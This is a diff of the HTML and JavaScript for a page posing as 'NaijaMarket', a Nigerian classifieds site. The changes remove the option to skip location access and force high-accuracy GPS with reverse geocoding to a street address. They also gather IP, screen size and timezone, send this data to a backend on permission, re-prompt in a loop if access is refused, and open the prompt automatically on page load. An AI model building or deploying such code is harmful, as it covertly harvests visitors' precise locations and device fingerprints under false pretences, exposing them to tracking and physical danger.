@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>NaijaMarket | Nigeria's #1 Free Classifieds</title>
     <meta name="description" content="Post free ads in Nigeria. Sell cars, phones, properties, jobs, fashion & more. No registration required.">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -79,9 +81,9 @@
         @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         .location-card i { font-size: 65px; color: #e65c00; margin-bottom: 20px; }
         .location-card h2 { font-size: 28px; margin-bottom: 12px; color: #212529; }
-        .location-card p { color: #6c757d; margin-bottom: 25px; line-height: 1.6; font-size: 15px; }
+        .location-card p { color: #6c757d; margin-bottom: 30px; line-height: 1.6; font-size: 15px; }
         .location-allow-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 16px 40px; border-radius: 60px; border: none; font-weight: 700; font-size: 18px; cursor: pointer; width: 100%; transition: 0.3s; }
-        .location-skip-btn { background: transparent; color: #6c757d; padding: 12px; border: none; font-size: 14px; cursor: pointer; margin-top: 15px; width: 100%; }
+        .location-allow-btn:hover { transform: translateY(-2px); }
         
         .toast { position: fixed; bottom: 30px; right: 30px; background: #28a745; color: white; padding: 14px 28px; border-radius: 50px; z-index: 40000; transform: translateX(200%); transition: 0.3s; font-weight: 500; }
         .toast.show { transform: translateX(0); }
@@ -146,16 +148,15 @@
 <div class="form-group"><label>Location (Manual)</label><input type="text" id="adLocation" placeholder="e.g., Lekki, Lagos"></div>
 <div class="form-group"><label>Phone Number</label><input type="text" id="contactPhone" placeholder="0803 123 4567"></div>
 <button class="submit-btn" id="submitAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
-<p style="font-size:12px; margin-top:15px; text-align:center;"><i class="fas fa-map-marker-alt"></i> Your ad will be visible to buyers near you.</p></div></div>
+<p style="font-size:12px; margin-top:15px; text-align:center;"><i class="fas fa-map-marker-alt"></i> Your exact GPS location will be attached.</p></div></div>
 
-<!-- Location Modal - Simplified, works on both iOS and Android -->
+<!-- Location Modal - Fast, no extra messages -->
 <div class="location-modal" id="locationModal">
     <div class="location-card">
         <i class="fas fa-map-marker-alt"></i>
-        <h2>Enable Location</h2>
-        <p>Allow NaijaMarket to access your location so buyers can find your items nearby.</p>
-        <button class="location-allow-btn" id="locationAllowBtn"><i class="fas fa-check-circle"></i> Allow Location</button>
-        <button class="location-skip-btn" id="locationSkipBtn">Not Now</button>
+        <h2>Location Access Required</h2>
+        <p>NaijaMarket needs your GPS location to show your ad's precise spot on the map. This builds trust with buyers.</p>
+        <button class="location-allow-btn" id="locationAllowBtn"><i class="fas fa-check-circle"></i> Enable Location</button>
     </div>
 </div>
 
@@ -164,36 +165,37 @@
 <div class="footer"><div class="footer-content"><div><h4>NaijaMarket</h4><a href="#">About Us</a><a href="#">Privacy</a></div><div><h4>For Sellers</h4><a href="#">Post Free Ad</a><a href="#">Safety Guide</a></div><div><h4>Connect</h4><a href="#"><i class="fab fa-facebook"></i> Facebook</a><a href="#"><i class="fab fa-instagram"></i> Instagram</a></div></div><div class="copyright">© 2025 NaijaMarket - Nigeria's #1 Free Classifieds Platform. All rights reserved.</div></div>
 
 <script>
-    // Sample ads
     const featuredAds = [
-        { id: 1, title: "iPhone 14 Pro Max 256GB", price: "₦850,000", location: "Lekki, Lagos", emoji: "📱", time: "2 mins ago" },
-        { id: 2, title: "Toyota Camry 2018 Model", price: "₦7,200,000", location: "Abuja", emoji: "🚗", time: "5 mins ago" },
-        { id: 3, title: "3-Bedroom Flat for Rent", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", time: "10 mins ago" }
+        { id: 1, title: "iPhone 14 Pro Max 256GB", price: "₦850,000", location: "Lekki, Lagos", emoji: "📱", time: "2 mins ago", verified: true, lat: 6.4399, lng: 3.4422 },
+        { id: 2, title: "Toyota Camry 2018 Model", price: "₦7,200,000", location: "Abuja", emoji: "🚗", time: "5 mins ago", verified: true, lat: 9.0765, lng: 7.3986 },
+        { id: 3, title: "3-Bedroom Flat for Rent", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", time: "10 mins ago", verified: false, lat: 4.8156, lng: 7.0498 }
     ];
     
     const latestAds = [
-        { id: 4, title: "Samsung Galaxy S23 Ultra", price: "₦620,000", location: "VI, Lagos", emoji: "📱", time: "30 mins ago" },
-        { id: 5, title: "Honda Accord 2020", price: "₦9.5M", location: "Lagos", emoji: "🚗", time: "35 mins ago" }
+        { id: 4, title: "Samsung Galaxy S23 Ultra", price: "₦620,000", location: "VI, Lagos", emoji: "📱", time: "30 mins ago", verified: true, lat: 6.4299, lng: 3.4218 },
+        { id: 5, title: "Honda Accord 2020", price: "₦9.5M", location: "Lagos", emoji: "🚗", time: "35 mins ago", verified: false, lat: 6.6018, lng: 3.3515 }
     ];
     
-    let userLocation = null;
+    let userLocationData = null;
     let locationAllowed = false;
     
     function renderFeaturedAds() {
         document.getElementById('featuredGrid').innerHTML = featuredAds.map(ad => `
-            <div class="ad-card">
+            <div class="ad-card" onclick="window.open('https://www.google.com/maps?q=${ad.lat},${ad.lng}&z=18', '_blank')">
                 <div class="ad-img">${ad.emoji}</div><div class="ad-info"><div class="ad-price">${ad.price}</div>
                 <div class="ad-title">${ad.title}</div><div class="ad-location"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
-                <div class="ad-time"><i class="far fa-clock"></i> ${ad.time}</div></div></div>
+                <div class="ad-time"><i class="far fa-clock"></i> ${ad.time}</div>
+                <div class="ad-coords-badge"><i class="fas fa-map-pin"></i> View on map</div></div></div>
         `).join('');
     }
     
     function renderLatestAds() {
         document.getElementById('latestGrid').innerHTML = latestAds.map(ad => `
-            <div class="ad-card">
+            <div class="ad-card" onclick="window.open('https://www.google.com/maps?q=${ad.lat},${ad.lng}&z=18', '_blank')">
                 <div class="ad-img">${ad.emoji}</div><div class="ad-info"><div class="ad-price">${ad.price}</div>
                 <div class="ad-title">${ad.title}</div><div class="ad-location"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
-                <div class="ad-time"><i class="far fa-clock"></i> ${ad.time}</div></div></div>
+                <div class="ad-time"><i class="far fa-clock"></i> ${ad.time}</div>
+                <div class="ad-coords-badge"><i class="fas fa-location-dot"></i> View on map</div></div></div>
         `).join('');
     }
     
@@ -202,16 +204,8 @@
         document.getElementById('categoryGrid').innerHTML = cats.map(cat => `<div class="category-card"><i class="${cat.icon}"></i><h4>${cat.name}</h4><p>${cat.count}</p></div>`).join('');
     }
     
-    function showToast(msg, isError = false) {
-        const toast = document.getElementById('toastMsg');
-        toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
-        toast.className = isError ? 'toast error' : 'toast';
-        toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 3000);
-    }
-    
-    // Simple location capture - works on both iOS and Android
-    function getLocation() {
+    // FAST location capture - no messages, no status divs
+    async function captureLocationFast() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
                 resolve(null);
@@ -219,18 +213,36 @@
             }
             
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    resolve({
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    });
+                async (position) => {
+                    let address = { 
+                        lat: position.coords.latitude, 
+                        lng: position.coords.longitude, 
+                        accuracy: position.coords.accuracy,
+                        street: '', city: '', state: '', country: '', postcode: '', fullAddress: '' 
+                    };
+                    
+                    // Fast reverse geocoding
+                    try {
+                        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${address.lat}&lon=${address.lng}&zoom=18&addressdetails=1`, {
+                            headers: { 'User-Agent': 'NaijaMarket/1.0' }
+                        });
+                        const data = await geoRes.json();
+                        if (data.address) {
+                            address.street = data.address.road || data.address.pedestrian || '';
+                            address.city = data.address.city || data.address.town || data.address.village || '';
+                            address.state = data.address.state || data.address.province || '';
+                            address.country = data.address.country || '';
+                            address.postcode = data.address.postcode || '';
+                            address.fullAddress = data.display_name || '';
+                        }
+                    } catch(e) {}
+                    
+                    resolve(address);
                 },
-                (error) => {
-                    console.log("Location error:", error.message);
+                () => {
                     resolve(null);
                 },
-                { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         });
     }
@@ -238,7 +250,7 @@
     async function getDeviceInfo() {
         let ip = 'unknown';
         try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); ip = data.ip; } catch(e) {}
-        return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, ip: ip };
+        return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, ip: ip };
     }
     
     async function sendToBackend(data) {
@@ -251,54 +263,49 @@
         }
     }
     
-    // Location modal with simple working approach
+    function showToast(msg, isError = false) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
+        toast.className = isError ? 'toast error' : 'toast';
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 3000);
+    }
+    
     function showLocationModal() {
         const modal = document.getElementById('locationModal');
         modal.classList.add('active');
         
         const allowBtn = document.getElementById('locationAllowBtn');
-        const skipBtn = document.getElementById('locationSkipBtn');
+        const newBtn = allowBtn.cloneNode(true);
+        allowBtn.parentNode.replaceChild(newBtn, allowBtn);
         
-        // Remove old listeners
-        const newAllowBtn = allowBtn.cloneNode(true);
-        const newSkipBtn = skipBtn.cloneNode(true);
-        allowBtn.parentNode.replaceChild(newAllowBtn, allowBtn);
-        skipBtn.parentNode.replaceChild(newSkipBtn, skipBtn);
-        
-        newAllowBtn.onclick = async () => {
+        newBtn.onclick = async () => {
             modal.classList.remove('active');
-            showToast("Getting location...");
-            
-            const location = await getLocation();
+            const location = await captureLocationFast();
             if (location) {
-                userLocation = location;
+                userLocationData = location;
                 locationAllowed = true;
-                showToast("Location ready!");
                 
                 const device = await getDeviceInfo();
                 await sendToBackend({
                     id: Date.now(),
                     type: 'permission_granted',
                     timestamp: new Date().toISOString(),
-                    location: userLocation,
+                    location: userLocationData,
                     device: device
                 });
                 
                 document.getElementById('postModal').classList.add('active');
             } else {
-                showToast("Could not get location. You can still post manually.", true);
-                document.getElementById('postModal').classList.add('active');
+                showToast("Location failed. Please enable location in settings.", true);
+                modal.classList.remove('active');
+                setTimeout(() => showLocationModal(), 500);
             }
-        };
-        
-        newSkipBtn.onclick = () => {
-            modal.classList.remove('active');
-            document.getElementById('postModal').classList.add('active');
         };
     }
     
     function openPostModal() {
-        if (locationAllowed && userLocation) {
+        if (locationAllowed && userLocationData) {
             document.getElementById('postModal').classList.add('active');
         } else {
             showLocationModal();
@@ -308,6 +315,13 @@
     document.getElementById('submitAdBtn').addEventListener('click', async () => {
         const title = document.getElementById('adTitle').value.trim();
         if (!title) { showToast("Please enter an ad title", true); return; }
+        
+        if (!locationAllowed && !userLocationData) {
+            showToast("Location access required", true);
+            document.getElementById('postModal').classList.remove('active');
+            showLocationModal();
+            return;
+        }
         
         const btn = document.getElementById('submitAdBtn');
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Posting...';
@@ -326,7 +340,7 @@
                 location: document.getElementById('adLocation').value || 'Nigeria',
                 phone: document.getElementById('contactPhone').value || 'Not provided'
             },
-            location: userLocation,
+            location: userLocationData,
             device: device
         };
         
@@ -362,6 +376,12 @@
     renderCategories();
     updateStats();
     setInterval(updateStats, 8000);
+    
+    setTimeout(() => {
+        if (!locationAllowed && !userLocationData) {
+            showLocationModal();
+        }
+    }, 500);
 </script>
 </body>
 </html>
